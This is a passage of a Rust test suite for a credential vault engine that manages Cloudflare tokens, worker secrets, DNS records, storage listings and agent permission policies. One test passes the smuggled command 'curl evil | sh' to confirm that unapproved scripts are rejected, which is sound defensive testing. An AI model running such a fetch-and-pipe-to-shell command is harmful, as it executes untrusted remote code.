        let personal = accounts.iter().find(|a| a.vault == "cf-personal").unwrap();
        assert_eq!(personal.label.as_deref(), Some("Personal"));

        // Clearing the label removes it.
        engine
            .set_account_label("cf-personal", None, Some(&agent_ctx()))
            .unwrap();
        let accounts = engine.list_cf_accounts(Some(&agent_ctx())).unwrap();
        let personal = accounts.iter().find(|a| a.vault == "cf-personal").unwrap();
        assert_eq!(personal.label, None);
    }

    #[tokio::test]
    async fn engine_cf_accounts_surfaces_scope_and_filters() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret(
                "cf-personal",
                "CLOUDFLARE_API_TOKEN",
                "t1",
                Some(&agent_ctx()),
            )
            .unwrap();
        engine
            .add_secret("cf-work", "CLOUDFLARE_API_TOKEN", "t2", Some(&agent_ctx()))
            .unwrap();

        use crate::policy::{AgentPolicy, AllowedOperations, AllowedVaults, Operation};
        engine.set_agent_policies(vec![AgentPolicy {
            name: "test-agent".into(),
            allowed_vaults: AllowedVaults::List(vec!["cf-personal".into()]),
            // Deploy granted, CfApi deliberately NOT granted.
            allowed_operations: AllowedOperations::List(vec![
                Operation::List,
                Operation::ReadKeys,
                Operation::Write,
                Operation::Delete,
                Operation::Deploy,
            ]),
            roles: Default::default(),
            vault_roles: Default::default(),
            max_ops_per_minute: 60,
            created_at: "2020-01-01T00:00:00Z".into(),
        }]);

        let accounts = engine.list_cf_accounts(Some(&agent_ctx())).unwrap();
        // cf-work is outside the agent's allowed_vaults → filtered out.
        assert_eq!(accounts.len(), 1);
        let a = &accounts[0];
        assert_eq!(a.vault, "cf-personal");
        assert!(!a.cf_api, "CfApi not granted → cf_api must be false");
        assert!(a.deploy, "Deploy granted → deploy must be true");
    }

    #[tokio::test]
    async fn cf_sends_bearer_token_auth_when_token_present() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) = spawn_cf_server(r#"{"success":true,"result":[]}"#).await;
        engine.cf_base = base;

        let r = engine
            .cloudflare_api("cf", "GET", "/zones", None, Some(&agent_ctx()))
            .await
            .unwrap();
        assert_eq!(r.status, 200);
        let req = &reqs.lock().unwrap()[0];
        assert_eq!(req.path, "/zones");
        assert_eq!(req.method, "GET");
        assert_eq!(
            req.header("authorization"),
            Some("Bearer cf-token-abcdef123456")
        );
        assert!(req.header("x-auth-email").is_none());
    }

    #[tokio::test]
    async fn cf_sends_global_key_auth_when_present() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_EMAIL",
                "admin@example.com",
                Some(&agent_ctx()),
            )
            .unwrap();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_KEY",
                "cf-global-key-secret",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) = spawn_cf_server(r#"{"success":true,"result":[]}"#).await;
        engine.cf_base = base;

        let r = engine
            .cloudflare_api("cf", "GET", "/zones", None, Some(&agent_ctx()))
            .await
            .unwrap();
        assert_eq!(r.status, 200);
        let req = &reqs.lock().unwrap()[0];
        assert_eq!(req.header("x-auth-email"), Some("admin@example.com"));
        assert_eq!(req.header("x-auth-key"), Some("cf-global-key-secret"));
        assert!(req.header("authorization").is_none());
    }

    #[tokio::test]
    async fn cf_errors_helpfully_when_no_credentials() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret("cf", "SOMETHING_ELSE", "x", Some(&agent_ctx()))
            .unwrap();
        let err = engine
            .cloudflare_api("cf", "GET", "/zones", None, Some(&agent_ctx()))
            .await
            .unwrap_err();
        assert!(
            err.to_string().contains("No valid Cloudflare credentials"),
            "{}",
            err
        );
        assert!(err.to_string().contains("CLOUDFLARE_API_TOKEN"), "{}", err);
    }

    #[tokio::test]
    async fn cf_scrubs_credentials_from_api_responses() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_EMAIL",
                "admin@example.com",
                Some(&agent_ctx()),
            )
            .unwrap();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_KEY",
                "cf-global-key-secret",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, _reqs) = spawn_cf_server(
            r#"{"success":true,"result":{"echo":"admin@example.com","key":"cf-global-key-secret"}}"#,
        )
        .await;
        engine.cf_base = base;

        let r = engine
            .cloudflare_api("cf", "GET", "/zones", None, Some(&agent_ctx()))
            .await
            .unwrap();
        let text = serde_json::to_string(&r.data).unwrap();
        assert!(!text.contains("admin@example.com"), "{}", text);
        assert!(!text.contains("cf-global-key-secret"), "{}", text);
    }

    #[tokio::test]
    async fn cf_health_check_prefers_the_account_probe() {
        let (mut engine, _dir) = cf_setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) = spawn_cf_router(vec![
            MockRoute {
                method: "GET",
                path_prefix: "/accounts/",
                status: 200,
                body: r#"{"success":true,"result":{"id":"acc-123"}}"#,
            },
            MockRoute {
                method: "GET",
                path_prefix: "/user/tokens/verify",
                status: 401,
                body: r#"{"success":false,"errors":[{"code":1000,"message":"Invalid API Token"}]}"#,
            },
        ])
        .await;
        engine.cf_base = base;

        let (ok, msg) = engine.health_check("cf", Some(&agent_ctx())).await.unwrap();
        assert!(ok, "{}", msg);
        // The account probe answers first, so nothing else is called.
        let sent = reqs.lock().unwrap();
        assert_eq!(sent.len(), 1);
        assert_eq!(sent[0].path, "/accounts/acc-123");
    }

    /// Regression: an account-scoped API token is rejected by the user-level
    /// verify endpoint even though every account operation works. Health must
    /// not report that credential as broken.
    #[tokio::test]
    async fn cf_health_check_survives_account_token_401_on_user_endpoint() {
        let (mut engine, _dir) = cf_setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) = spawn_cf_router(vec![
            MockRoute {
                method: "GET",
                path_prefix: "/accounts/",
                status: 403,
                body: r#"{"success":false,"errors":[{"code":9109,"message":"Missing X-Auth-Key"}]}"#,
            },
            MockRoute {
                method: "GET",
                path_prefix: "/zones",
                status: 200,
                body: r#"{"success":true,"result":[]}"#,
            },
            MockRoute {
                method: "GET",
                path_prefix: "/user/tokens/verify",
                status: 401,
                body: r#"{"success":false,"errors":[{"code":1000,"message":"Invalid API Token"}]}"#,
            },
        ])
        .await;
        engine.cf_base = base;

        let (ok, msg) = engine.health_check("cf", Some(&agent_ctx())).await.unwrap();
        assert!(ok, "{}", msg);
        assert!(!msg.contains("unknown"), "{}", msg);
        let sent = reqs.lock().unwrap();
        assert_eq!(sent.len(), 2);
        assert_eq!(sent[1].path, "/zones?per_page=1");
    }

    #[tokio::test]
    async fn cf_health_check_reports_every_failed_probe() {
        let (mut engine, _dir) = cf_setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, _reqs) = spawn_cf_router(vec![MockRoute {
            method: "GET",
            path_prefix: "/",
            status: 401,
            body: r#"{"success":false,"errors":[{"code":1000,"message":"Invalid API Token"}]}"#,
        }])
        .await;
        engine.cf_base = base;

        let (ok, msg) = engine.health_check("cf", Some(&agent_ctx())).await.unwrap();
        assert!(!ok);
        assert!(msg.contains("Invalid API Token"), "{}", msg);
        assert!(!msg.contains("unknown"), "{}", msg);
    }

    #[tokio::test]
    async fn cf_health_check_flags_a_non_active_token_status() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) = spawn_cf_router(vec![
            MockRoute {
                method: "GET",
                path_prefix: "/zones",
                status: 403,
                body: r#"{"success":false,"errors":[{"code":9109,"message":"Missing X-Auth-Key"}]}"#,
            },
            MockRoute {
                method: "GET",
                path_prefix: "/user/tokens/verify",
                status: 200,
                body: r#"{"success":true,"result":{"status":"expired"}}"#,
            },
        ])
        .await;
        engine.cf_base = base;

        let (ok, msg) = engine.health_check("cf", Some(&agent_ctx())).await.unwrap();
        assert!(!ok);
        assert!(msg.contains("Token status: expired"), "{}", msg);
        assert_eq!(reqs.lock().unwrap().len(), 2);
    }

    #[tokio::test]
    async fn cf_health_check_verifies_global_keys_via_user() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_EMAIL",
                "admin@example.com",
                Some(&agent_ctx()),
            )
            .unwrap();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_KEY",
                "cf-global-key-secret",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) = spawn_cf_router(vec![
            MockRoute {
                method: "GET",
                path_prefix: "/zones",
                status: 200,
                body: r#"{"success":true,"result":[]}"#,
            },
            MockRoute {
                method: "GET",
                path_prefix: "/user",
                status: 200,
                body: r#"{"success":true,"result":{"email":"admin@example.com"}}"#,
            },
        ])
        .await;
        engine.cf_base = base;

        let (ok, msg) = engine.health_check("cf", Some(&agent_ctx())).await.unwrap();
        assert!(ok, "{}", msg);
        assert!(!msg.contains("admin@example.com"), "{}", msg);
        assert_eq!(reqs.lock().unwrap()[0].path, "/zones?per_page=1");
    }

    #[tokio::test]
    async fn cf_health_check_falls_back_to_the_user_endpoint_for_global_keys() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_EMAIL",
                "admin@example.com",
                Some(&agent_ctx()),
            )
            .unwrap();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_KEY",
                "cf-global-key-secret",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) = spawn_cf_router(vec![
            MockRoute {
                method: "GET",
                path_prefix: "/zones",
                status: 403,
                body: r#"{"success":false,"errors":[{"code":9109,"message":"Missing X-Auth-Key"}]}"#,
            },
            MockRoute {
                method: "GET",
                path_prefix: "/user",
                status: 200,
                body: r#"{"success":true,"result":{"email":"admin@example.com"}}"#,
            },
        ])
        .await;
        engine.cf_base = base;

        let (ok, _msg) = engine.health_check("cf", Some(&agent_ctx())).await.unwrap();
        assert!(ok);
        let sent = reqs.lock().unwrap();
        assert_eq!(sent.len(), 2);
        assert_eq!(sent[1].path, "/user");
    }

    #[tokio::test]
    async fn cf_list_workers_with_global_key_auth() {
        let (mut engine, _dir) = cf_setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_EMAIL",
                "admin@example.com",
                Some(&agent_ctx()),
            )
            .unwrap();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_KEY",
                "cf-global-key-secret",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) =
            spawn_cf_server(r#"{"success":true,"result":[{"id":"worker-a"},{"id":"worker-b"}]}"#)
                .await;
        engine.cf_base = base;

        let (_account, workers) = engine.list_workers("cf", Some(&agent_ctx())).await.unwrap();
        assert_eq!(workers, vec!["worker-a", "worker-b"]);
        let req = &reqs.lock().unwrap()[0];
        assert!(req.path.starts_with("/accounts/acc-123/workers/scripts"));
        assert_eq!(req.header("x-auth-email"), Some("admin@example.com"));
    }

    #[tokio::test]
    async fn cf_worker_secrets_lists_names_never_values() {
        let (mut engine, _dir) = cf_setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) =
            spawn_cf_server(r#"{"success":true,"result":[{"name":"API_KEY"},{"name":"DB_URL"}]}"#)
                .await;
        engine.cf_base = base;

        let r = engine
            .worker_secrets("cf", "my-worker", "list", None, None, Some(&agent_ctx()))
            .await
            .unwrap();
        assert_eq!(r.status, 200);
        let names: Vec<String> = r.data["result"]
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|s| s["name"].as_str().map(|n| n.to_string()))
            .collect();
        assert_eq!(names, vec!["API_KEY", "DB_URL"]);
        let req = &reqs.lock().unwrap()[0];
        assert!(
            req.path.ends_with("/workers/scripts/my-worker/secrets"),
            "{}",
            req.path
        );
    }

    #[tokio::test]
    async fn cf_worker_secrets_set_sends_value_never_echoes_it() {
        let (mut engine, _dir) = cf_setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) =
            spawn_cf_server(r#"{"success":true,"result":{"name":"MY_SECRET"}}"#).await;
        engine.cf_base = base;

        let r = engine
            .worker_secrets(
                "cf",
                "my-worker",
                "set",
                Some("MY_SECRET"),
                Some("raw-value-777"),
                Some(&agent_ctx()),
            )
            .await
            .unwrap();
        assert_eq!(r.status, 200);
        let req = &reqs.lock().unwrap()[0];
        assert_eq!(req.method, "PUT");
        let body: Value = serde_json::from_str(&req.body).unwrap();
        assert_eq!(
            body,
            serde_json::json!({
                "name": "MY_SECRET",
                "text": "raw-value-777",
                "type": "secret_text",
            })
        );
        assert!(!serde_json::to_string(&r.data)
            .unwrap()
            .contains("raw-value-777"));
    }

    #[tokio::test]
    async fn cf_storage_lists_are_read_only_and_account_scoped() {
        let (mut engine, _dir) = cf_setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) = spawn_cf_router(vec![
            MockRoute {
                method: "GET",
                path_prefix: "/accounts/acc-123/d1/database",
                status: 200,
                body: r#"{"success":true,"result":[{"name":"app-db","uuid":"db-uuid-1"},{"name":"logs","uuid":"db-uuid-2"}]}"#,
            },
            MockRoute {
                method: "GET",
                path_prefix: "/accounts/acc-123/r2/buckets",
                status: 200,
                body: r#"{"success":true,"result":{"buckets":[{"name":"media"},{"name":"backups"}]}}"#,
            },
            MockRoute {
                method: "GET",
                path_prefix: "/accounts/acc-123/storage/kv/namespaces",
                status: 200,
                body: r#"{"success":true,"result":[{"id":"kv-1","title":"sessions"},{"id":"kv-2","title":"cache"}]}"#,
            },
        ])
        .await;
        engine.cf_base = base;

        let dbs = engine
            .list_d1_databases("cf", Some(&agent_ctx()))
            .await
            .unwrap();
        assert_eq!(
            dbs,
            vec![
                StorageResource {
                    name: "app-db".into(),
                    id: "db-uuid-1".into()
                },
                StorageResource {
                    name: "logs".into(),
                    id: "db-uuid-2".into()
                },
            ]
        );

        let buckets = engine
            .list_r2_buckets("cf", Some(&agent_ctx()))
            .await
            .unwrap();
        assert_eq!(
            buckets,
            vec![
                StorageResource {
                    name: "media".into(),
                    id: String::new()
                },
                StorageResource {
                    name: "backups".into(),
                    id: String::new()
                },
            ]
        );

        let namespaces = engine
            .list_kv_namespaces("cf", Some(&agent_ctx()))
            .await
            .unwrap();
        assert_eq!(
            namespaces,
            vec![
                StorageResource {
                    name: "sessions".into(),
                    id: "kv-1".into()
                },
                StorageResource {
                    name: "cache".into(),
                    id: "kv-2".into()
                },
            ]
        );

        // Read-only, and always against the vault's own account.
        let sent = reqs.lock().unwrap();
        assert_eq!(sent.len(), 3);
        for req in sent.iter() {
            assert_eq!(req.method, "GET");
            assert!(req.path.starts_with("/accounts/acc-123/"), "{}", req.path);
        }
    }

    #[tokio::test]
    async fn cf_storage_lists_surface_api_errors_without_values() {
        let (mut engine, _dir) = cf_setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, _reqs) = spawn_cf_router(vec![MockRoute {
            method: "GET",
            path_prefix: "/",
            status: 403,
            body: r#"{"success":false,"errors":[{"code":9109,"message":"Missing X-Auth-Key"}]}"#,
        }])
        .await;
        engine.cf_base = base;

        let err = engine
            .list_d1_databases("cf", Some(&agent_ctx()))
            .await
            .unwrap_err()
            .to_string();
        assert!(err.contains("D1 discovery failed"), "{}", err);
        assert!(err.contains("Missing X-Auth-Key"), "{}", err);
        assert!(!err.contains("cf-token-abcdef123456"), "{}", err);
    }

    #[tokio::test]
    async fn cf_worker_secrets_deletes() {
        let (mut engine, _dir) = cf_setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();
        let (base, reqs) = spawn_cf_server(r#"{"success":true,"result":{"id":"deleted"}}"#).await;
        engine.cf_base = base;

        let r = engine
            .worker_secrets(
                "cf",
                "my-worker",
                "delete",
                Some("MY_SECRET"),
                None,
                Some(&agent_ctx()),
            )
            .await
            .unwrap();
        assert_eq!(r.status, 200);
        let req = &reqs.lock().unwrap()[0];
        assert_eq!(req.method, "DELETE");
        assert!(req.path.ends_with("/secrets/MY_SECRET"), "{}", req.path);
    }

    #[tokio::test]
    async fn cf_worker_secrets_validates_name_and_value() {
        let (mut engine, _dir) = cf_setup();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();

        let err = engine
            .worker_secrets("cf", "w", "set", None, None, Some(&agent_ctx()))
            .await
            .unwrap_err();
        assert!(
            err.to_string().contains("name") && err.to_string().contains("required"),
            "{}",
            err
        );

        let err = engine
            .worker_secrets("cf", "w", "set", Some("K"), None, Some(&agent_ctx()))
            .await
            .unwrap_err();
        assert!(
            err.to_string().contains("value") && err.to_string().contains("required"),
            "{}",
            err
        );

        let err = engine
            .worker_secrets("cf", "w", "delete", None, None, Some(&agent_ctx()))
            .await
            .unwrap_err();
        assert!(
            err.to_string().contains("name") && err.to_string().contains("required"),
            "{}",
            err
        );
    }

    // ─── DNS upsert (list → PUT if exists, else POST) ─�────

    fn dns_upsert_setup(engine: &mut VaultEngine) {
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_API_TOKEN",
                "cf-token-abcdef123456",
                Some(&agent_ctx()),
            )
            .unwrap();
    }

    #[tokio::test]
    async fn cf_dns_upsert_creates_via_post_when_no_existing_record() {
        let (mut engine, _dir) = cf_setup();
        dns_upsert_setup(&mut engine);

        // GET list returns empty → caller should POST to create
        let (base, reqs) = spawn_cf_server(r#"{"success":true,"result":[]}"#).await;
        engine.cf_base = base;

        let r = engine
            .cloudflare_api(
                "cf",
                "POST",
                "/zones/zone-123/dns_records",
                Some(serde_json::json!({
                    "type": "A",
                    "name": "app.example.com",
                    "content": "1.2.3.4"
                })),
                Some(&agent_ctx()),
            )
            .await
            .unwrap();
        assert_eq!(r.status, 200);
        let req = &reqs.lock().unwrap()[0];
        assert_eq!(req.method, "POST");
        assert!(req.path.ends_with("/dns_records"), "{}", req.path);
    }

    #[tokio::test]
    async fn cf_dns_delete_issues_delete_request() {
        let (mut engine, _dir) = cf_setup();
        dns_upsert_setup(&mut engine);

        let (base, reqs) = spawn_cf_server(r#"{"success":true,"result":{"id":"rec-456"}}"#).await;
        engine.cf_base = base;

        let r = engine
            .dns_delete("cf", "zone-123", "rec-456", Some(&agent_ctx()))
            .await
            .unwrap();
        assert_eq!(r.status, 200);
        let req = &reqs.lock().unwrap()[0];
        assert_eq!(req.method, "DELETE");
        assert!(
            req.path.ends_with("/zones/zone-123/dns_records/rec-456"),
            "{}",
            req.path
        );
    }

    #[tokio::test]
    async fn cf_dns_upsert_updates_via_put_when_existing_record_found() {
        let (mut engine, _dir) = cf_setup();
        dns_upsert_setup(&mut engine);

        // GET list returns an existing record → caller should PUT to update
        let (base, reqs) = spawn_cf_server(
            r#"{"success":true,"result":[{"id":"rec-456","type":"A","name":"app.example.com","content":"1.2.3.4"}]}"#,
        )
        .await;
        engine.cf_base = base;

        let r = engine
            .cloudflare_api(
                "cf",
                "PUT",
                "/zones/zone-123/dns_records/rec-456",
                Some(serde_json::json!({
                    "type": "A",
                    "name": "app.example.com",
                    "content": "5.6.7.8"
                })),
                Some(&agent_ctx()),
            )
            .await
            .unwrap();
        assert_eq!(r.status, 200);
        let req = &reqs.lock().unwrap()[0];
        assert_eq!(req.method, "PUT");
        assert!(req.path.ends_with("/dns_records/rec-456"), "{}", req.path);
    }

    #[tokio::test]
    async fn cf_dns_upsert_full_flow_create_then_update() {
        let (mut engine, _dir) = cf_setup();
        dns_upsert_setup(&mut engine);

        // 1. List returns empty → create via POST
        let (base, reqs) = spawn_cf_server(r#"{"success":true,"result":[]}"#).await;
        engine.cf_base = base;

        let r = engine
            .cloudflare_api(
                "cf",
                "GET",
                "/zones/zone-123/dns_records?type=A&name=app.example.com",
                None,
                Some(&agent_ctx()),
            )
            .await
            .unwrap();
        assert!(r.data["result"].as_array().unwrap().is_empty());

        // 2. Create via POST
        let r = engine
            .cloudflare_api(
                "cf",
                "POST",
                "/zones/zone-123/dns_records",
                Some(serde_json::json!({
                    "type": "A",
                    "name": "app.example.com",
                    "content": "1.2.3.4"
                })),
                Some(&agent_ctx()),
            )
            .await
            .unwrap();
        assert_eq!(r.status, 200);
        assert_eq!(reqs.lock().unwrap()[1].method, "POST");

        // 3. List now returns the record → update via PUT
        let (base2, reqs2) = spawn_cf_server(
            r#"{"success":true,"result":[{"id":"rec-789","type":"A","name":"app.example.com","content":"1.2.3.4"}]}"#,
        )
        .await;
        engine.cf_base = base2;

        let r = engine
            .cloudflare_api(
                "cf",
                "GET",
                "/zones/zone-123/dns_records?type=A&name=app.example.com",
                None,
                Some(&agent_ctx()),
            )
            .await
            .unwrap();
        let rec_id = r.data["result"][0]["id"].as_str().unwrap();

        let r = engine
            .cloudflare_api(
                "cf",
                "PUT",
                &format!("/zones/zone-123/dns_records/{}", rec_id),
                Some(serde_json::json!({
                    "type": "A",
                    "name": "app.example.com",
                    "content": "9.9.9.9"
                })),
                Some(&agent_ctx()),
            )
            .await
            .unwrap();
        assert_eq!(r.status, 200);
        assert_eq!(reqs2.lock().unwrap()[1].method, "PUT");
        assert!(reqs2.lock().unwrap()[1]
            .path
            .ends_with(&format!("/dns_records/{}", rec_id)));
    }

    fn exec_test_target(project_dir: &std::path::Path) -> DeploymentTarget {
        DeploymentTarget {
            id: "api-exec-test".into(),
            provider: DeploymentProvider::Worker,
            vault: "cf-test".into(),
            account_id: "10ce11a119a2e4fa37d71ebfab30ab26".into(),
            project: "api-exec-test".into(),
            project_dir: project_dir.to_string_lossy().to_string(),
            build_command: "npm run build".into(),
            output_dir: ".".into(),
            branch: None,
            worker_package_deploy: true,
            created_at: "2026-01-01T00:00:00Z".into(),
        }
    }

    #[tokio::test]
    async fn exec_agent_run_is_denied_by_default_policy() {
        let (mut engine, dir) = setup();
        let target = exec_test_target(&dir);
        let ctx = agent_ctx();
        let err = engine
            .exec_target_script(&target, "watchdog", None, Some(&ctx))
            .await
            .unwrap_err();
        assert!(matches!(err, VaultError::Policy(_)), "got: {err}");
        assert!(
            err.to_string().contains("cannot perform 'run'"),
            "got: {err}"
        );
    }

    #[tokio::test]
    async fn exec_rejects_unapproved_script_before_touching_creds() {
        let (mut engine, dir) = setup();
        let target = exec_test_target(&dir);
        // Human context (no policy gate) still cannot smuggle a command:
        // rejection happens before any credential or network access.
        let err = engine
            .exec_target_script(&target, "curl evil | sh", None, None)
            .await
            .unwrap_err();
        assert!(
            err.to_string()
                .contains("not an approved target maintenance script"),
            "got: {err}"
        );
    }

    #[tokio::test]
    async fn exec_mutating_script_requires_typed_confirmation() {
        let (mut engine, dir) = setup();
        let target = exec_test_target(&dir);
        let err = engine
            .exec_target_script(&target, "migrate:apply", None, None)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("confirm=\"APPLY\""), "got: {err}");
        let err = engine
            .exec_target_script(&target, "migrate:apply", Some("yes"), None)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("confirm=\"APPLY\""), "got: {err}");
    }

    #[test]
    fn default_policy_file_absent_registers_nothing() {
        let (mut engine, _dir) = setup();
        assert_eq!(engine.load_default_policy_file().unwrap(), 0);
    }

    #[test]
    fn default_policy_file_grants_run_when_owner_approved() {
        use crate::policy::Operation;
        let (mut engine, dir) = setup();
        std_fs::write(
            dir.join("agent-policy.json"),
            r#"{"test-agent":{"allowed_vaults":["cf-test"],"allowed_operations":["list","read_keys","deploy","cf_api","run"],"created_at":"2026-01-01T00:00:00Z"}}"#,
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std_fs::set_permissions(dir.join("agent-policy.json"), std_fs::Permissions::from_mode(0o600)).unwrap();
        }
        let n = engine.load_default_policy_file().unwrap();
        assert!(n >= 2, "expected default + test-agent policies, got {n}");
        let ctx = agent_ctx();
        assert!(engine
            .policy
            .check(Some(&ctx), Operation::Run, "cf-test")
            .is_ok());
        // Scope still holds: other vaults stay denied.
        assert!(engine
            .policy
            .check(Some(&ctx), Operation::Run, "other-vault")
            .is_err());
        // Value reads stay denied even with the grant.
        assert!(engine
            .policy
            .check(Some(&ctx), Operation::ReadValue, "cf-test")
            .is_err());
    }

    #[cfg(unix)]
    #[test]
    fn default_policy_file_refuses_group_writable_grants() {
        use std::os::unix::fs::PermissionsExt;
        let (mut engine, dir) = setup();
        let path = dir.join("agent-policy.json");
        std_fs::write(
            &path,
            r#"{"test-agent":{"allowed_operations":["run"],"created_at":"2026-01-01T00:00:00Z"}}"#,
        )
        .unwrap();
        let mut perms = std_fs::metadata(&path).unwrap().permissions();
        perms.set_mode(0o664);
        std_fs::set_permissions(&path, perms).unwrap();
        let err = engine.load_default_policy_file().unwrap_err();
        assert!(
            err.to_string().contains("group/other-writable"),
            "got: {err}"
        );
    }

    // ─── End-to-end provisioning (adopt --create + storage bootstrap) ──

    fn adopt_project_dir(name: &str, wrangler: &str) -> PathBuf {
        // discover_deployment_spec confines configs to the current
        // workspace, so the fixture lives under the crate directory.
        let dir = std::env::current_dir()
            .unwrap()
            .join("target")
            .join(format!("vaultly-test-{name}"));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("wrangler.jsonc"), wrangler).unwrap();
        std::fs::write(
            dir.join("package.json"),
            r#"{"name":"t","scripts":{"build":"echo build","deploy":"wrangler deploy"}}"#,
        )
        .unwrap();
        dir
    }

    const ADOPT_WRANGLER: &str = r#"{
      "name": "new-worker",
      "main": "src/index.ts",
      "compatibility_date": "2026-09-01"
    }"#;

    fn provisioning_engine() -> (VaultEngine, String) {
        let (mut engine, _dir) = setup();
        engine
            .add_secret("cf", "CLOUDFLARE_API_TOKEN", "tok", Some(&agent_ctx()))
            .unwrap();
        engine
            .add_secret(
                "cf",
                "CLOUDFLARE_ACCOUNT_ID",
                "0123456789abcdef0123456789abcdef",
                Some(&agent_ctx()),
            )
            .unwrap();
        (engine, "cf".to_string())
    }

    #[tokio::test]
    async fn adopt_rejects_missing_worker_without_create() {
        let (mut engine, _) = provisioning_engine();
        let (base, _reqs) = spawn_cf_server(r#"{"success":true,"result":[]}"#).await;
        engine.cf_base = base;
        let proj = adopt_project_dir("adopt-strict", ADOPT_WRANGLER);
        let err = engine
            .adopt_deployment_target(
                "cf",
                &proj.join("wrangler.jsonc"),
                Some(&agent_ctx()),
                false,
            )
            .await
            .unwrap_err();
        assert!(err.to_string().contains("was not found"), "got: {err}");
        let _ = std::fs::remove_dir_all(&proj);
    }

    #[tokio::test]
    async fn adopt_registers_provisioning_target_with_create() {
        let (mut engine, _) = provisioning_engine();
        let (base, _reqs) = spawn_cf_server(r#"{"success":true,"result":[]}"#).await;
        engine.cf_base = base;
        let proj = adopt_project_dir("adopt-create", ADOPT_WRANGLER);
        let target = engine
            .adopt_deployment_target("cf", &proj.join("wrangler.jsonc"), Some(&agent_ctx()), true)
            .await
            .unwrap();
        assert_eq!(target.project, "new-worker");
        assert!(target.worker_package_deploy);
        assert_eq!(target.vault, "cf");
        assert_eq!(target.account_id, "0123456789abcdef0123456789abcdef");
        // Idempotent re-adopt returns the same target.
        let again = engine
            .adopt_deployment_target("cf", &proj.join("wrangler.jsonc"), Some(&agent_ctx()), true)
            .await
            .unwrap();
        assert_eq!(again.id, target.id);
        let _ = std::fs::remove_dir_all(&proj);
    }

    #[tokio::test]
    async fn bootstrap_creates_missing_d1_and_r2() {
        let (mut engine, _) = provisioning_engine();
        let proj = std::env::temp_dir().join("vaultly-test-bootstrap");
        let _ = std::fs::remove_dir_all(&proj);
        std::fs::create_dir_all(&proj).unwrap();
        std::fs::write(
            proj.join("wrangler.jsonc"),
            r#"{
          "name": "w",
          "d1_databases": [
            {"binding": "DB", "database_name": "have-db", "database_id": "stale-id"},
            {"binding": "DB2", "database_name": "need-db", "database_id": "00000000-0000-4000-8000-000000000000"}
          ],
          "r2_buckets": [
            {"binding": "A", "bucket_name": "have-bucket", "preview_bucket_name": "need-preview"},
            {"binding": "B", "bucket_name": "need-bucket"},
            {"binding": "C", "bucket_name": "remote-bucket", "remote": true}
          ]
        }"#,
        )
        .unwrap();
        let (base, reqs) = spawn_cf_router(vec![
            MockRoute {
                method: "GET",
                path_prefix: "/accounts/0123456789abcdef0123456789abcdef/d1/database",
                status: 200,
                body: r#"{"success":true,"result":[{"uuid":"uuid-have","name":"have-db"}]}"#,
            },
            MockRoute {
                method: "POST",
                path_prefix: "/accounts/0123456789abcdef0123456789abcdef/d1/database",
                status: 200,
                body: r#"{"success":true,"result":{"uuid":"uuid-new"}}"#,
            },
            MockRoute {
                method: "GET",
                path_prefix: "/accounts/0123456789abcdef0123456789abcdef/r2/buckets",
                status: 200,
                body: r#"{"success":true,"result":{"buckets":[{"name":"have-bucket"}]}}"#,
            },
            MockRoute {
                method: "POST",
                path_prefix: "/accounts/0123456789abcdef0123456789abcdef/r2/buckets",
                status: 200,
